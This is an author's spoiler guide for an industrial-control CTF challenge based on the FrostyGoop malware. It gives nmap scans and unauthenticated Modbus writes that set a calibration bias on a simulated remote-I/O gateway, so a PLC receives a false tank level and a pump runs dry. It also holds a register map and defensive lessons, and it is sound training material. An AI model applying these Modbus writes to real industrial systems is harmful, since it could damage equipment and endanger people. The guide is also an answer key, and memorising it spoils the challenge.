# Challenge author guide

This document contains spoilers. Do not distribute it to players.

## Learning objectives

Players should demonstrate that they can:

1. distinguish the physical process, remote I/O, PLC and HMI roles;
2. identify Modbus/TCP devices and process tags on an OT network;
3. interpret 3xxxx input and 4xxxx holding registers;
4. understand the security consequence of unauthenticated protocol writes;
5. recognize that a correct PLC decision can become unsafe when its input is
   false;
6. cause and verify a cyber-physical consequence rather than merely obtaining
   network access.

## Threat-informed scenario

The primary inspiration is FrostyGoop. Dragos reported that the malware sent
Modbus commands to ENCO controllers during a disruptive Ukrainian district
heating incident, causing inaccurate measurements and system malfunctions.
MITRE ATT&CK records that FrostyGoop reads and writes holding registers over
Modbus/TCP to modify parameters.

This challenge does not reproduce the malware, victim product, target or exact
register map. It safely adapts the observed behavior into a fictional bottling
process: an unauthorized Modbus write changes an instrument calibration
parameter and corrupts the level value consumed by a PLC.

ATT&CK mappings:

- T0801: Monitor Process State;
- T0836: Modify Parameter;
- T0869: Standard Application Layer Protocol;
- T1692.001: Unauthorized Message: Command Message;
- T0832: Manipulation of View;
- T0879: Damage to Property, simulated only.

References:

- Dragos, *Protect Against FrostyGoop ICS Malware Targeting Operational
  Technology*: https://www.dragos.com/blog/protect-against-frostygoop-ics-malware-targeting-operational-technology
- MITRE ATT&CK S1165, *FrostyGoop*: https://attack.mitre.org/software/S1165/
- MITRE ATT&CK T1692.001, *Unauthorized Message: Command Message*:
  https://attack.mitre.org/techniques/T1692/001/
- Modbus Organization, *Modbus Security*: https://www.modbus.org/news/modbus-security-new-protocol-to-improve-control-system-security

## Intended solution

1. SSH to the supplied player workstation.
2. Discover live hosts, then scan only the responsive industrial candidates.
   This avoids a slow full-port scan of every unused address:

   ```sh
   nmap -sn -n 172.30.10.0/24
   nmap -sT -Pn -n -p- --open --min-rate 3000 --max-retries 1 \
     172.30.10.11-13 172.30.10.20
   ```

3. Query the standard Modbus device-identification objects:

   ```sh
   mbcli identify 172.30.10.11
   mbcli identify 172.30.10.12
   mbcli identify 172.30.10.13
   ```

   Device identity distinguishes the tank/pump controller, unrelated bottle
   conveyor controller and LT-101 remote-I/O gateway. The player should reason
   that PLC-101 is the affected controller, while RIO-101 is the source of the
   contradictory tank-level measurement.
4. Read RIO-101 input register 30001 and observe it across multiple samples:

   ```sh
   mbcli read-input 172.30.10.13 30001 2
   ```

5. Probe the bounded holding-register space. Register 40001 exists and starts
   at zero; 40002 returns a Modbus illegal-address exception. Apply a small,
   reversible test value:

   ```sh
   mbcli write 172.30.10.13 40001 500
   ```

   The HMI jumps upward by approximately five percentage points, establishing
   that 40001 is a signed calibration bias without relying on a hidden
   register-map file. Normal process flow may move the underlying level during
   the comparison.
6. Restore the test value to zero, then use the unauthenticated Modbus write
   function to apply a large positive calibration bias to LT-101:

   ```sh
   mbcli write 172.30.10.13 40001 0
   mbcli write 172.30.10.13 40001 10000
   ```

   The raw value `10000` represents a `+100.00%` calibration bias.

7. Monitor PLC-101 telemetry with a portable loop:

   ```sh
   for i in $(seq 1 30); do
     date -u +%H:%M:%S
     mbcli read-input 172.30.10.11 30001 10
     sleep 3
   done
   ```

   Do not rely on `watch`: some player terminals advertise `xterm-kitty`,
   which the minimal container's terminfo database does not recognize.

8. Observe the reported tank level remain high while the inlet closes. The
   physical tank empties, P-101 continues to run, the dry-run alarm asserts,
   temperature/vibration and damage rise, and machine state becomes `3`.
9. Visit the supplied checker and claim the flag.

No PLC operating-mode change is required. Trying the former manual-mode path
does not solve the challenge: PLC-101 now applies its reported low-level
permissive in both automatic and manual-on modes.

## Causal model

```text
Unauthenticated FC06 write
        ↓
RIO-101 calibration bias changes
        ↓
Actual level + malicious bias = false reported level
        ↓
PLC-101 trusts false-high LT-101 input
        ↓
Inlet closes and pump remains permitted
        ↓
Independent physical tank empties
        ↓
Sustained dry run → simulated pump seizure → flag
```

The flag checker reads the authoritative physical model, not the PLC or HMI
registers. Merely changing a displayed number is insufficient; the false data
must propagate through the controller and produce the terminal process state.

## Relevant register map

| Device | Reference | Direction | Meaning | Scale |
|---|---:|---|---|---:|
| RIO-101 | 40001 | R/W | signed LT-101 calibration bias | 0.01% |
| RIO-101 | 30001 | R | level reported to PLC-101 | 0.01% |
| RIO-101 | 30002 | R | sensor communication quality | 1 |
| PLC-101 | 30001 | R | received tank level | 0.01% |
| PLC-101 | 30002 | R | inlet status | 1 |
| PLC-101 | 30003 | R | pump status | 1 |
| PLC-101 | 30004 | R | temperature °C | 0.1 |
| PLC-101 | 30005 | R | vibration mm/s | 0.1 |
| PLC-101 | 30006 | R | dry-run seconds | 0.1 |
| PLC-101 | 30007 | R | damage percent | 0.01% |
| PLC-101 | 30010 | R | machine state | 1 |

## Defensive lessons

The solution should lead naturally to discussion of:

- using Modbus Security/TLS or an authenticated gateway where supported;
- restricting which hosts may communicate with field I/O;
- allowlisting Modbus function codes and writable address ranges;
- alerting on writes to calibration and safety-relevant parameters;
- using independent hardwired protection for damaging failure modes;
- comparing process values with independent sensors or physical invariants.

Modbus port 502 remains private to the challenge control network. The lab does
not teach or require internet-wide device discovery.

## Difficulty tuning

Easier:

- add a RIO-101 diagnostics view and label holding register 40001 as
  `CAL_BIAS`;
- display both the raw register and scaled value side by side;
- lower the initial tank level or reduce the damage delay.

Harder:

- replace the FUXA device addresses with Docker DNS names while retaining
  device and tag names;
- provide a short packet capture containing normal PLC-to-RIO polling;
- add a decoy Modbus temperature gateway;
- require players to encode a negative signed register during a second stage;
- monitor and revert the malicious bias unless the write is repeated.

The production FUXA project deliberately polls only PLC-101 and PLC-102, not
RIO-101. The device-identification route is sufficient without an HMI clue
page: the
names `Tank and Transfer Pump Controller`, `Bottle Conveyor Controller`, and
`LT-101 Remote I/O Gateway` identify the relevant data flow. Keep the register
map bounded and retain the player hint that measurements normally use 3xxxx
references while settings use 4xxxx references. The intended skill is
controlled protocol experimentation and process reasoning, not blind register
corruption.

## CTFd integration

For this standalone instance, retrieve the derived flag from the FUXA incident
banner or checker after running the author test and add it as an exact CTFd
flag. For per-team instances, keep the checker endpoint as the source of truth
and deploy a unique `INSTANCE_ID` and secret per team.
